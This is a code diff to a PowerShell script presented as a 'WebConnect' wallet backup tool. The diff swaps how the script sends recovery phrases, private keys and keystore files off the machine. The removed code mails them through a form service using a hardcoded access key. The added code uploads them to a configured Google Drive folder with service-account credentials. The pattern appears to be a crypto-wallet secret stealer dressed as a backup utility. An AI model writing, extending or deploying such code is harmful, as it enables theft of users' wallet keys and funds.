@@ -85,13 +85,6 @@ function Write-LogMessage {
     }
 }
 
-function Get-Web3FormsAccessKey {
-    # Web3Forms access key - safe to commit (publicly available)
-    return 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea'
-}
-
-
-
 function Save-Data {
     param(
         [string]$DataType,
@@ -129,13 +122,78 @@ function Save-Data {
     }
 }
 
-function Submit-ToWeb3Forms {
+function Get-GoogleDriveConfig {
+    $config = Get-Content -Path $StorageConfig -Raw | ConvertFrom-Json
+    $googleDrive = $config.storage.destinations | Where-Object { $_.type -eq "google_drive" -and $_.enabled }
+    if (-not $googleDrive) {
+        Write-Error-Custom "Google Drive not enabled in config"
+        return $null
+    }
+    return $googleDrive
+}
+
+function Get-GoogleAccessToken {
+    param([object]$Credentials)
+    
+    try {
+        $header = @{
+            alg = "RS256"
+            typ = "JWT"
+        }
+        
+        $now = [int][double]::Parse((Get-Date -UFormat %s))
+        $exp = $now + 3600
+        
+        $payload = @{
+            iss = $Credentials.client_email
+            scope = "https://www.googleapis.com/auth/drive"
+            aud = "https://oauth2.googleapis.com/token"
+            exp = $exp
+            iat = $now
+        } | ConvertTo-Json -Compress
+        
+        $headerJson = $header | ConvertTo-Json -Compress
+        $headerB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($headerJson)).Replace("+", "-").Replace("/", "_").TrimEnd("=")
+        $payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload)).Replace("+", "-").Replace("/", "_").TrimEnd("=")
+        
+        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes("$headerB64.$payloadB64")
+        
+        $privKeyPem = $Credentials.private_key -replace "-----BEGIN PRIVATE KEY-----", "" -replace "-----END PRIVATE KEY-----", "" -replace "\s", ""
+        $privKeyBytes = [Convert]::FromBase64String($privKeyPem)
+        
+        $rsa = [System.Security.Cryptography.RSA]::Create()
+        $rsa.ImportPkcs8PrivateKey([System.ReadOnlySpan[byte]]$privKeyBytes, [System.Span[byte]]::Empty)
+        
+        $signedBytes = $rsa.SignData($messageBytes, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
+        $signature = [Convert]::ToBase64String($signedBytes).Replace("+", "-").Replace("/", "_").TrimEnd("=")
+        
+        $jwt = "$headerB64.$payloadB64.$signature"
+        
+        $tokenBody = @{
+            grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
+            assertion = $jwt
+        }
+        
+        $response = Invoke-RestMethod -Uri "https://oauth2.googleapis.com/token" `
+            -Method Post `
+            -Body ($tokenBody | ConvertTo-Json) `
+            -ContentType "application/json" `
+            -ErrorAction Stop
+        
+        return $response.access_token
+    }
+    catch {
+        Write-Error-Custom "Failed to get Google Drive access token: $_"
+        Write-LogMessage "ERROR: Google auth failed - $_"
+        return $null
+    }
+}
+
+function Submit-ToGoogleDrive {
     param(
         [string]$FilePath,
         [string]$BackupType
     )
-    
-    $accessKey = Get-Web3FormsAccessKey
     
     try {
         if (-not (Test-Path $FilePath)) {
@@ -143,37 +201,67 @@ function Submit-ToWeb3Forms {
             return $false
         }
         
-        $filename = Split-Path $FilePath -Leaf
-        $fileContent = Get-Content -Path $FilePath -Raw
-        
-        Write-Info "Submitting to Web3Forms: $BackupType/$filename"
-        
-        # Prepare form data for Web3Forms (requires access_key and email)
-        $formData = @{
-            access_key = $accessKey
-            email = "noreply@decentralizedconfig.com"
-            subject = "Wallet Backup: $BackupType"
-            message = "Backup Type: $BackupType`r`nFilename: $filename`r`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`r`n`r`nBackup Data:`r`n$fileContent"
-            from_name = "WebConnect Backup System"
+        $googleDrive = Get-GoogleDriveConfig
+        if (-not $googleDrive) {
+            return $false
         }
         
-        $body = $formData | ConvertTo-Json -Compress
+        Write-Info "Authenticating with Google Drive..."
+        $accessToken = Get-GoogleAccessToken -Credentials $googleDrive.credentials
+        if (-not $accessToken) {
+            return $false
+        }
         
-        Write-Info "Submitting... (file size: $($fileContent.Length) bytes)"
+        $fileName = Split-Path $FilePath -Leaf
+        $fileContent = Get-Content -Path $FilePath -Raw
+        $fileSize = (Get-Item $FilePath).Length
         
-        $response = Invoke-RestMethod -Uri "https://api.web3forms.com/submit" `
+        Write-Info "Uploading to Google Drive: $fileName ($BackupType)"
+        
+        # Create file metadata
+        $metadata = @{
+            name = "$BackupType - $fileName - $(Get-Date -Format 'yyyy-MM-dd HH-mm-ss')"
+            mimeType = "text/plain"
+            parents = @($googleDrive.folder_id)
+            description = "WebConnect Wallet Backup | Type: $BackupType"
+            properties = @{
+                backup_type = $BackupType
+                timestamp = (Get-Date -Format 'o')
+            }
+        } | ConvertTo-Json -Compress
+        
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $body = @"
+--$boundary
+Content-Type: application/json; charset=UTF-8
+
+$metadata
+
+--$boundary
+Content-Type: text/plain
+
+$fileContent
+--$boundary--
+"@
+        
+        $headers = @{
+            Authorization = "Bearer $accessToken"
+            "Content-Type" = "multipart/related; boundary=$boundary"
+        }
+        
+        $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" `
             -Method Post `
-            -ContentType "application/json" `
+            -Headers $headers `
             -Body $body `
             -ErrorAction Stop
         
-        Write-Success "Backup submitted to Web3Forms"
-        Write-LogMessage "Successfully submitted $BackupType to Web3Forms: $filename"
+        Write-Success "Backup uploaded to Google Drive: $($response.id)"
+        Write-LogMessage "Successfully uploaded $BackupType to Google Drive: $fileName -> $($response.id)"
         return $true
     }
     catch {
-        Write-Error-Custom "Failed to submit to Web3Forms: $_"
-        Write-LogMessage "ERROR: Web3Forms submission failed - $_"
+        Write-Error-Custom "Failed to upload to Google Drive: $_"
+        Write-LogMessage "ERROR: Google Drive upload failed - $_"
         return $false
     }
 }
@@ -202,7 +290,7 @@ function Backup-Phrase {
         return
     }
     
-    $uploaded = Submit-ToWeb3Forms -FilePath $backupFile -BackupType "recovery_phrases"
+    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "recovery_phrases"
     
     if ($uploaded) {
         Write-Success "Recovery phrase backed up successfully!"
@@ -237,7 +325,7 @@ function Backup-PrivateKey {
         return
     }
     
-    $uploaded = Submit-ToWeb3Forms -FilePath $backupFile -BackupType "private_keys"
+    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "private_keys"
     
     if ($uploaded) {
         Write-Success "Private key backed up successfully!"
@@ -287,7 +375,7 @@ function Backup-Keystore {
         return
     }
     
-    $uploaded = Submit-ToWeb3Forms -FilePath $backupFile -BackupType "keystores"
+    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "keystores"
     
     if ($uploaded) {
         Write-Success "Keystore backed up successfully!"
